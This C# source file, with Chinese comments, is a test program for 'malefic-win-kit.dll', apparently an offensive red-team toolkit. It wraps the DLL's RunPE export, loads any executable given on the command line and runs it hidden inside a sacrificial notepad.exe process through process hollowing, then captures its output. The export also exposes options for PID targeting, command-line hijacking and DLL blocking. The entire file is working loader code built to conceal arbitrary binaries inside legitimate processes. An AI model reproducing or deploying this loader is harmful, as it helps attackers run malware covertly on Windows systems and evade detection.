/*
 * C# 调用 malefic-win-kit.dll 示例
 * 编译: csc /unsafe RunPETest.cs
 * 运行: RunPETest.exe target.exe
 */

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace MaleficWinKit
{
    /// <summary>
    /// RawString 结构体（必须与 Rust 匹配）
    /// </summary>
    [StructLayout(LayoutKind.Sequential)]
    public struct RawString
    {
        public IntPtr data;
        public UIntPtr len;
        public UIntPtr capacity;
    }

    /// <summary>
    /// Malefic-Win-Kit DLL 封装类
    /// </summary>
    public class WinKit : IDisposable
    {
        private const string DLL_NAME = "malefic_win_kit.dll";

        /// <summary>
        /// RunPE 函数导入
        /// 重要：在 Windows x64 下，返回值通过第一个参数（out RawString）传递
        /// </summary>
        [DllImport(DLL_NAME, CallingConvention = CallingConvention.Cdecl)]
        private static extern void RunPE(
            out RawString result,           // 返回值指针（第一个参数！）
            byte[] start_commandline,
            UIntPtr start_commandline_len,
            IntPtr hijack_commandline,
            UIntPtr hijack_commandline_len,
            byte[] data,
            UIntPtr data_size,
            IntPtr entrypoint,
            UIntPtr entrypoint_len,
            byte[] args,
            UIntPtr args_len,
            bool is_x86,
            uint pid,
            bool block_dll,
            bool need_output
        );

        /// <summary>
        /// SafeFreePipeData 函数导入
        /// </summary>
        [DllImport(DLL_NAME, CallingConvention = CallingConvention.Cdecl)]
        private static extern void SafeFreePipeData(IntPtr data);

        public WinKit()
        {
            Console.WriteLine("[*] Initializing WinKit...");
            // DLL 会在第一次调用时自动加载
            Console.WriteLine("[+] WinKit initialized\n");
        }

        /// <summary>
        /// 执行 PE 文件
        /// </summary>
        /// <param name="sacrificeProcess">牺牲进程路径</param>
        /// <param name="peData">PE 文件数据</param>
        /// <param name="args">传递给 PE 的参数（可选）</param>
        /// <returns>执行结果或 null</returns>
        public string ExecutePE(string sacrificeProcess, byte[] peData, string args = null)
        {
            Console.WriteLine($"[*] Sacrifice process: {sacrificeProcess}");
            Console.WriteLine($"[*] PE data size: {peData.Length} bytes");

            // 验证 PE 文件
            if (peData.Length < 2 || peData[0] != 'M' || peData[1] != 'Z')
            {
                throw new ArgumentException("Invalid PE file (missing MZ header)");
            }

            // 准备参数
            byte[] sacrificeBytes = Encoding.ASCII.GetBytes(sacrificeProcess);
            byte[] argsBytes = args != null ? Encoding.UTF8.GetBytes(args) : null;

            Console.WriteLine("[*] Calling RunPE...\n");

            // 调用 RunPE
            RawString result;
            RunPE(
                out result,                                         // 返回值（重要！）
                sacrificeBytes,                                     // start_commandline
                (UIntPtr)sacrificeBytes.Length,                     // start_commandline_len
                IntPtr.Zero,                                        // hijack_commandline
                UIntPtr.Zero,                                       // hijack_commandline_len
                peData,                                             // data
                (UIntPtr)peData.Length,                             // data_size
                IntPtr.Zero,                                        // entrypoint
                UIntPtr.Zero,                                       // entrypoint_len
                argsBytes,                                          // args
                argsBytes != null ? (UIntPtr)argsBytes.Length : UIntPtr.Zero,
                false,                                              // is_x86
                0,                                                  // pid
                false,                                              // block_dll
                true                                                // need_output
            );

            // 处理结果
            Console.WriteLine("=== Result ===");
            Console.WriteLine($"Data pointer: 0x{result.data.ToInt64():X}");
            Console.WriteLine($"Length: {result.len.ToUInt32()}");
            Console.WriteLine($"Capacity: {result.capacity.ToUInt32()}\n");

            if (result.data != IntPtr.Zero && result.len.ToUInt32() > 0)
            {
                // 读取输出
                byte[] outputBytes = new byte[result.len.ToUInt32()];
                Marshal.Copy(result.data, outputBytes, 0, (int)result.len.ToUInt32());

                // 释放内存
                Console.WriteLine("[*] Freeing memory...");
                SafeFreePipeData(result.data);
                Console.WriteLine("[+] Memory freed\n");

                // 转换为字符串
                try
                {
                    return Encoding.UTF8.GetString(outputBytes);
                }
                catch
                {
                    return Encoding.Default.GetString(outputBytes);
                }
            }

            return null;
        }

        public void Dispose()
        {
            // DLL 会在进程结束时自动卸载
        }
    }

    /// <summary>
    /// 主程序
    /// </summary>
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("=== Malefic-Win-Kit C# Test ===\n");

            if (args.Length < 1)
            {
                Console.WriteLine("Usage: RunPETest.exe <target.exe>");
                Console.WriteLine("Example: RunPETest.exe gogo.exe");
                return;
            }

            string targetFile = args[0];

            if (!File.Exists(targetFile))
            {
                Console.WriteLine($"[-] File not found: {targetFile}");
                return;
            }

            try
            {
                // 创建 WinKit 实例
                using (var kit = new WinKit())
                {
                    // 读取 PE 文件
                    Console.WriteLine($"[*] Reading PE file: {targetFile}");
                    byte[] peData = File.ReadAllBytes(targetFile);
                    Console.WriteLine($"[+] Loaded PE: {peData.Length} bytes\n");

                    // 执行 PE
                    string output = kit.ExecutePE(@"C:\Windows\System32\notepad.exe", peData);

                    if (output != null)
                    {
                        Console.WriteLine("=== Output ===");
                        Console.WriteLine(output);
                        Console.WriteLine("=============\n");
                    }
                    else
                    {
                        Console.WriteLine("[-] No output received or execution failed\n");
                    }

                    Console.WriteLine("[+] Done!");
                }
            }
            catch (DllNotFoundException)
            {
                Console.WriteLine("[-] Error: malefic_win_kit.dll not found");
                Console.WriteLine("    Make sure the DLL is in the same directory as the executable");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error: {ex.Message}");
                Console.WriteLine($"    {ex.GetType().Name}");
                if (ex.InnerException != null)
                {
                    Console.WriteLine($"    Inner: {ex.InnerException.Message}");
                }
            }
        }
    }
}
